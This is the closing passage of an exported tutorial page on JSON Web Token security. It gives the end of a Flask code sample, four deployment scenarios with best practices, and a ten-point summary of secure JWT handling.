+        })
+    except Exception as e:
+        return jsonify({&#x27;error&#x27;: str(e)}), 401
+
+if __name__ == &#x27;__main__&#x27;:
+    app.run(debug=True)
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2cf562ad-76f0-8047-ad15-dbf3b6cc39d6"/></div><div style="display:contents" dir="auto"><h2 id="2cf562ad-76f0-80e9-bb39-f2dc00183276" class=""><strong>Real-World Scenarios</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-8003-a8f0-e4c8725e39d2" class=""><strong>Scenario 1: Single Page Application (SPA)</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8028-9265-d19f34a24f07" class=""><strong>Requirements:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8023-8d9a-cdde086bd2da" class="bulleted-list"><li style="list-style-type:disc">Frontend: React/Vue/Angular</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8075-845d-e354af6c6381" class="bulleted-list"><li style="list-style-type:disc">Backend: REST API</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8056-8d0f-d8bd96fca2df" class="bulleted-list"><li style="list-style-type:disc">Authentication: JWT</li></ul></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8086-b83c-d0ab24d745a0" class=""><strong>Implementation:</strong></p></div><div style="display:contents" dir="auto"><ol type="1" id="2cf562ad-76f0-8072-9330-cf3b30b98a55" class="numbered-list" start="1"><li>User logs in → Backend returns JWT</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2cf562ad-76f0-8032-828c-f67201d4b19a" class="numbered-list" start="2"><li>Frontend stores JWT in httpOnly cookie (via backend) or memory</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2cf562ad-76f0-80e3-92fe-df8f0d0ce134" class="numbered-list" start="3"><li>Frontend sends JWT in Authorization header for API requests</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2cf562ad-76f0-8046-ad9e-d5cbbb884232" class="numbered-list" start="4"><li>Backend validates JWT on each request</li></ol></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80f5-9d16-f98edd4db977" class=""><strong>Best Practices:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-805b-9513-ee38914eb03d" class="bulleted-list"><li style="list-style-type:disc">Use httpOnly cookies set by backend (most secure)</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8050-b310-fe6cd403c0f4" class="bulleted-list"><li style="list-style-type:disc">Or store in memory (cleared on page refresh)</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-809f-aa4a-f13856a517b4" class="bulleted-list"><li style="list-style-type:disc">Avoid localStorage (XSS vulnerable)</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80d1-8420-c779afab4ee4" class="bulleted-list"><li style="list-style-type:disc">Implement token refresh mechanism</li></ul></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-80e0-b170-e33aec955225" class=""><strong>Scenario 2: Microservices Architecture</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-808c-8a31-d167b22f5e06" class=""><strong>Requirements:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8093-a1d6-cf117b0a8221" class="bulleted-list"><li style="list-style-type:disc">Multiple services need to verify tokens</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8064-8c82-e353b49b35c2" class="bulleted-list"><li style="list-style-type:disc">Services don&#x27;t share secrets</li></ul></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8036-b82a-eef294ab43fb" class=""><strong>Implementation:</strong></p></div><div style="display:contents" dir="auto"><ol type="1" id="2cf562ad-76f0-80b5-afee-f83c34016527" class="numbered-list" start="1"><li>Use RSA/ECDSA (asymmetric) algorithms</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2cf562ad-76f0-809a-a50c-d5d9371d1f92" class="numbered-list" start="2"><li>Auth service signs tokens with private key</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2cf562ad-76f0-8059-98fa-cd9baa31ff01" class="numbered-list" start="3"><li>Other services verify with public key</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2cf562ad-76f0-804b-80f2-e7b10b04dfc7" class="numbered-list" start="4"><li>Public key distributed to all services</li></ol></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80bd-b4d2-ca7d5c26a9fb" class=""><strong>Best Practices:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-804c-bf06-cd11c79ba70f" class="bulleted-list"><li style="list-style-type:disc">Use RS256 or ES256 algorithm</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80c1-afff-ef8f48aafa56" class="bulleted-list"><li style="list-style-type:disc">Distribute public key securely</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-805d-8159-d18e17dbdfd5" class="bulleted-list"><li style="list-style-type:disc">Implement JWKS (JSON Web Key Set) endpoint</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-802f-8869-e65aef86e240" class="bulleted-list"><li style="list-style-type:disc">Rotate keys periodically</li></ul></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-80ac-9ec9-d4e966f6c991" class=""><strong>Scenario 3: Mobile Application</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8099-8efc-f6252f7f2670" class=""><strong>Requirements:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80ab-869d-f1c558866f0c" class="bulleted-list"><li style="list-style-type:disc">iOS/Android app</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80ce-a1b1-eefaabde8dc5" class="bulleted-list"><li style="list-style-type:disc">Backend API</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8002-b429-cb8bcb78a5bc" class="bulleted-list"><li style="list-style-type:disc">Secure token storage</li></ul></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80ec-9416-eba839bfa0ec" class=""><strong>Implementation:</strong></p></div><div style="display:contents" dir="auto"><ol type="1" id="2cf562ad-76f0-807c-a1ab-d94304ddc79b" class="numbered-list" start="1"><li>User logs in → Backend returns JWT</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2cf562ad-76f0-8035-9acb-f9a728a029a2" class="numbered-list" start="2"><li>App stores JWT in secure storage (Keychain/Keystore)</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2cf562ad-76f0-80ba-8296-c53575425b2b" class="numbered-list" start="3"><li>App sends JWT in Authorization header</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2cf562ad-76f0-8083-bb5f-d4fda52e22cc" class="numbered-list" start="4"><li>Backend validates JWT</li></ol></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-806f-ae83-fb6a61167135" class=""><strong>Best Practices:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8036-85af-ccb7861c4266" class="bulleted-list"><li style="list-style-type:disc">Use platform secure storage (Keychain/Keystore)</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8055-86c8-fc3b406ad4b6" class="bulleted-list"><li style="list-style-type:disc">Use short token expiration</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8035-a128-c41b8b12dcfd" class="bulleted-list"><li style="list-style-type:disc">Implement token refresh</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80fa-bfd0-d48ea1a5b4e4" class="bulleted-list"><li style="list-style-type:disc">Use HTTPS for all communication</li></ul></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-8003-8334-caa3f0ad4ef3" class=""><strong>Scenario 4: Third-Party API Integration</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80d1-97fa-c70ade124f8f" class=""><strong>Requirements:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80dd-9c95-f92347ac59b4" class="bulleted-list"><li style="list-style-type:disc">Your app calls third-party API</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-804d-a370-eca69506dfd6" class="bulleted-list"><li style="list-style-type:disc">Third-party API requires JWT authentication</li></ul></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8071-afcc-d5a42eb0a3f2" class=""><strong>Implementation:</strong></p></div><div style="display:contents" dir="auto"><ol type="1" id="2cf562ad-76f0-80ee-bbd2-f8cf044a77b5" class="numbered-list" start="1"><li>Third-party provides API key/secret</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2cf562ad-76f0-809d-8a14-c8a94048ffa9" class="numbered-list" start="2"><li>Your backend creates JWT with their requirements</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2cf562ad-76f0-80e3-833d-fc2bb121e59a" class="numbered-list" start="3"><li>Your backend signs JWT with their secret</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2cf562ad-76f0-807e-afb6-f11a6b6383dd" class="numbered-list" start="4"><li>Your backend includes JWT in API requests</li></ol></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-803b-8bad-d7de8e77cbc1" class=""><strong>Best Practices:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8062-8e44-dbd5c0d56ec3" class="bulleted-list"><li style="list-style-type:disc">Follow third-party JWT requirements exactly</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-805f-9392-d8969989cac2" class="bulleted-list"><li style="list-style-type:disc">Store third-party secrets securely</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8045-81f4-e6c791efc06d" class="bulleted-list"><li style="list-style-type:disc">Implement proper error handling</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80b3-af45-f534d6ce62b6" class="bulleted-list"><li style="list-style-type:disc">Monitor token expiration</li></ul></div><div style="display:contents" dir="auto"><hr id="2cf562ad-76f0-8027-92f7-e7c2a5263822"/></div><div style="display:contents" dir="auto"><h2 id="2cf562ad-76f0-80fd-8b53-c60e4f5b5a45" class=""><strong>Summary</strong></h2></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-801f-a5fd-e611d4b4142b" class="">JWTs are a powerful tool for authentication and authorization, but they must be implemented correctly to be secure. Key points to remember:</p></div><div style="display:contents" dir="auto"><ol type="1" id="2cf562ad-76f0-8076-8662-d941c98f624b" class="numbered-list" start="1"><li><strong>Never store sensitive information</strong> in JWT payload</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2cf562ad-76f0-8001-8e17-f6fbe4f43b92" class="numbered-list" start="2"><li><strong>Always validate all claims</strong> including expiration</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2cf562ad-76f0-8038-9e48-eeedce007014" class="numbered-list" start="3"><li><strong>Use long, random secret keys</strong> (minimum 256 bits)</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2cf562ad-76f0-80b6-b5ed-fbb17adeda5c" class="numbered-list" start="4"><li><strong>Whitelist algorithms</strong> explicitly (never allow &#x27;none&#x27;)</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2cf562ad-76f0-80d0-bd2b-f36e05d456bc" class="numbered-list" start="5"><li><strong>Use HTTPS</strong> for all token transmission</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2cf562ad-76f0-80cb-8f39-d7fbf5219c0a" class="numbered-list" start="6"><li><strong>Store tokens securely</strong> (httpOnly cookies preferred)</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2cf562ad-76f0-809c-b14c-f1099d152835" class="numbered-list" start="7"><li><strong>Use short expiration times</strong> with refresh tokens</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2cf562ad-76f0-8042-8b35-dbe14c257826" class="numbered-list" start="8"><li><strong>Choose reliable libraries</strong> and keep them updated</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2cf562ad-76f0-80c9-aceb-f926f2d887d8" class="numbered-list" start="9"><li><strong>Validate and sanitize</strong> all claims and data</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2cf562ad-76f0-80fe-a54f-f073e25f1276" class="numbered-list" start="10"><li><strong>Follow security best practices</strong> throughout implementation</li></ol></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8036-bf03-d2ced6fd1ede" class="">Remember: <strong>Security is not about using the right technology, but about implementing it correctly.</strong></p></div></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
